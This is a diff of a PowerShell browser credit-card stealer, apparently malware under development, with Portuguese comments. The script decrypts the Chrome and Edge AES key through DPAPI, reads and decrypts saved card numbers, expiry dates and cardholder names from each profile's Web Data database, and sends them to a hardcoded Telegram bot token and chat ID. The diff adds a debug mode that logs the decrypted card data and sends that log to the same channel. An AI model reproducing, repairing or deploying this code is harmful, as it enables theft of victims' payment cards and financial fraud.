@@ -16,6 +16,7 @@ param(
   [switch]$NoTelegram,
   [switch]$Elevate,
   [switch]$ElevatedPass,
+  [switch]$Debug,
   [string]$TelegramToken = '8181336077:AAHhL3rtCxJovQl6F4xqMoiH7j9v6DZJnPM',
   [string]$TelegramChatId = '6168636325'
 )
@@ -24,6 +25,13 @@ param(
 $ErrorActionPreference = 'SilentlyContinue'
 $scriptDir = Split-Path -Parent $PSCommandPath
 if ($scriptDir) { [Environment]::CurrentDirectory = $scriptDir }   # p/ DllImport achar sqlite3.dll
+$script:DbgLog = $null
+if ($Debug) { $script:DbgLog = Join-Path $env:TEMP 'cc_debug.txt'; Set-Content -Path $script:DbgLog -Value '' -Encoding ASCII }
+function Add-Dbg([string]$msg) {
+  if (-not $Debug) { return }
+  Write-Host "DBG: $msg"
+  if ($script:DbgLog) { Add-Content -Path $script:DbgLog -Value $msg -Encoding ASCII }
+}
 
 # =====================================================================
 # P/Invoke
@@ -356,29 +364,37 @@ function Test-Admin {
 function Get-ChromeEdgeCards([string]$userDataDir, [string]$BrowserName) {
   $cards = New-Object System.Collections.Generic.List[object]
   $localState = Join-Path $userDataDir 'Local State'
-  if (-not (Test-Path $localState)) { return $cards }
+  if (-not (Test-Path $localState)) { Add-Dbg "${BrowserName}: Local State NAO encontrado em $localState"; return $cards }
+  Add-Dbg "${BrowserName}: Local State OK em $localState"
 
   # 1) chave AES-256 a partir de Local State
   $ls = $null
-  try { $ls = ([System.IO.File]::ReadAllText($localState)) | ConvertFrom-Json } catch { return $cards }
+  try { $ls = ([System.IO.File]::ReadAllText($localState)) | ConvertFrom-Json } catch { Add-Dbg "${BrowserName}: falha ao ler/parse Local State"; return $cards }
   $encKeyB64 = $ls.os_crypt.encrypted_key
-  if (-not $encKeyB64) { return $cards }
+  if (-not $encKeyB64) { Add-Dbg "${BrowserName}: encrypted_key AUSENTE no Local State"; return $cards }
   $encKeyB64 = $encKeyB64.Trim()
   $encKeyBytes = $null
-  try { $encKeyBytes = [System.Convert]::FromBase64String($encKeyB64) } catch { return $cards }
-  if ($encKeyBytes.Length -le 5) { return $cards }
+  try { $encKeyBytes = [System.Convert]::FromBase64String($encKeyB64) } catch { Add-Dbg "${BrowserName}: encrypted_key base64 invalido"; return $cards }
+  Add-Dbg "${BrowserName}: encrypted_key base64 len=$($encKeyBytes.Length)"
+  if ($encKeyBytes.Length -le 5) { Add-Dbg "${BrowserName}: encrypted_key curto (<=5 bytes)"; return $cards }
   $dpapiData = New-Object byte[] ($encKeyBytes.Length - 5)
   [Array]::Copy($encKeyBytes, 5, $dpapiData, 0, $dpapiData.Length)
   $aesKey = Dpapi-Unprotect $dpapiData
-  if ($null -eq $aesKey -or $aesKey.Length -ne 32) { return $cards }
+  if ($null -eq $aesKey -or $aesKey.Length -ne 32) { Add-Dbg "${BrowserName}: DPAPI falhou (null=$($null -eq $aesKey) len=$($aesKey.Length))"; return $cards }
+  Add-Dbg "${BrowserName}: DPAPI OK, chave AES len=32"
 
   # 2) Web Data de cada perfil
   $webDataFiles = Get-ChildItem $userDataDir -Recurse -Filter 'Web Data' -File -ErrorAction SilentlyContinue
+  Add-Dbg "${BrowserName}: Web Data encontrados=$($webDataFiles.Count)"
   foreach ($wd in $webDataFiles) {
     $profile = $wd.Directory.Name
+    Add-Dbg "${BrowserName}: Web Data em $($wd.FullName)"
     $tmp = Copy-DbToTemp $wd.FullName
+    $tmpSize = (Get-Item $tmp -ErrorAction SilentlyContinue).Length
+    Add-Dbg "${BrowserName}:   copia temp size=$tmpSize"
     # detecta colunas (nomes variam por versao do Chrome/Edge)
     $colNames = Get-TableColumns $tmp
+    Add-Dbg "${BrowserName}:   colunas=[$($colNames -join ', ')]"
     $idxName = -1; $idxNum = -1; $idxMon = -1; $idxYr = -1
     for ($i = 0; $i -lt $colNames.Count; $i++) {
       $c = $colNames[$i]
@@ -387,15 +403,21 @@ function Get-ChromeEdgeCards([string]$userDataDir, [string]$BrowserName) {
       if ($c -like 'expiration_month*') { if ($idxMon -lt 0) { $idxMon = $i } }
       if ($c -like 'expiration_year*') { if ($idxYr -lt 0) { $idxYr = $i } }
     }
-    if ($idxNum -lt 0) { Remove-Item $tmp -Force -ErrorAction SilentlyContinue; continue }
+    Add-Dbg "${BrowserName}:   idx: name=$idxName num=$idxNum mon=$idxMon yr=$idxYr"
+    if ($idxNum -lt 0) { Add-Dbg "${BrowserName}:   SEM coluna de numero -> pula"; Remove-Item $tmp -Force -ErrorAction SilentlyContinue; continue }
     $rows = Sqlite-Query $tmp 'SELECT * FROM credit_cards'
+    Add-Dbg "${BrowserName}:   linhas credit_cards=$($rows.Count)"
     Remove-Item $tmp -Force -ErrorAction SilentlyContinue
     foreach ($r in $rows) {
       $name = if ($idxName -ge 0) { Cell-Text $r[$idxName] } else { '' }
       $num = ''
       if ($idxNum -ge 0 -and $r[$idxNum]) {
-        $dec = Decrypt-VCrypt $r[$idxNum].Bytes $aesKey
+        $blob = $r[$idxNum].Bytes
+        $prefix = ''
+        if ($blob -and $blob.Length -ge 3) { $prefix = [System.Text.Encoding]::ASCII.GetString($blob[0..2]) }
+        $dec = Decrypt-VCrypt $blob $aesKey
         if ($dec) { $num = [System.Text.Encoding]::ASCII.GetString($dec) }
+        else { Add-Dbg "${BrowserName}:   linha: blob num len=$($blob.Length) prefix=[$prefix] decrypt=FALHOU" }
       }
       $mon = ''
       if ($idxMon -ge 0 -and $r[$idxMon]) {
@@ -407,7 +429,8 @@ function Get-ChromeEdgeCards([string]$userDataDir, [string]$BrowserName) {
         if ($r[$idxYr].Type -eq 1) { $yr = [string](Cell-Int $r[$idxYr]) }
         else { $dec = Decrypt-VCrypt $r[$idxYr].Bytes $aesKey; if ($dec) { $yr = [System.Text.Encoding]::ASCII.GetString($dec) } }
       }
-      if ($num -eq '') { continue }
+      if ($num -eq '') { Add-Dbg "${BrowserName}:   linha: numero vazio -> pula"; continue }
+      Add-Dbg "${BrowserName}:   linha OK: numero=$num exp=$mon/$yr nome=$name"
       $d = $num -replace '[^0-9]'
       $monDisp = $mon
       if ($mon -match '^\d+$') { $monDisp = ('{0:D2}' -f [int]$mon) }
@@ -564,6 +587,10 @@ foreach ($up in $users) {
   $chrome = Join-Path $up 'AppData\Local\Google\Chrome\User Data'
   $edge   = Join-Path $up 'AppData\Local\Microsoft\Edge\User Data'
   $ff     = Join-Path $up 'AppData\Roaming\Mozilla\Firefox\Profiles'
+  Add-Dbg "USER $up"
+  Add-Dbg "  Chrome dir: $(if (Test-Path $chrome) { 'existe' } else { 'NAO existe' }) ($chrome)"
+  Add-Dbg "  Edge   dir: $(if (Test-Path $edge) { 'existe' } else { 'NAO existe' }) ($edge)"
+  Add-Dbg "  Firefox dir: $(if (Test-Path $ff) { 'existe' } else { 'NAO existe' }) ($ff)"
   if (Test-Path $chrome) { $allCards.AddRange((Get-ChromeEdgeCards $chrome 'Chrome')) }
   if (Test-Path $edge)   { $allCards.AddRange((Get-ChromeEdgeCards $edge 'Edge')) }
   if (Test-Path $ff)     { $allCards.AddRange((Get-FirefoxCards $ff)) }
@@ -571,6 +598,14 @@ foreach ($up in $users) {
 $cards = @($allCards)
 
 $report = Format-Report $cards $hostName $user $os $psVer $isAdmin
+
+if ($Debug) {
+  $dbgContent = if ($script:DbgLog -and (Test-Path $script:DbgLog)) { (Get-Content $script:DbgLog -Raw) } else { '(sem log)' }
+  $dbgMsg = "=== DEBUG LOG (Host=$hostName User=$user) ===`n$dbgContent"
+  if (-not $DryRun -and -not $NoTelegram) {
+    [void](Send-TelegramText -Text $dbgMsg -Token $TelegramToken -ChatId $TelegramChatId)
+  }
+}
 
 if ($DryRun) {
   Write-Output $report
